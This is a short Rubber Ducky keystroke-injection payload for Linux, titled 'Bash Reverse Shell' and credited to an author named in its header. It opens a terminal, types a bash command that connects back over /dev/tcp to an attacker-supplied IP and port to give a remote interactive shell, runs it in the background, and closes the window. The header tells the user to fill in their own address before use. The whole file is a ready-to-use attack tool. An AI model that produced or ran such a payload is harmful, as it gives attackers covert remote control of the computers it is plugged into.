REM =====================================================
REM Title: Bash Reverse Shell
REM Author: yogeshjoga
REM Target: Linux (All distributions)
REM Category: Payload Installation
REM Description: Creates a reverse shell via bash
REM IMPORTANT: Replace YOUR_IP and YOUR_PORT before use
REM =====================================================

DELAY 1000
CTRL-ALT t
DELAY 1000
STRING bash -i >& /dev/tcp/YOUR_IP/YOUR_PORT 0>&1 &
ENTER
DELAY 500
STRING exit
ENTER
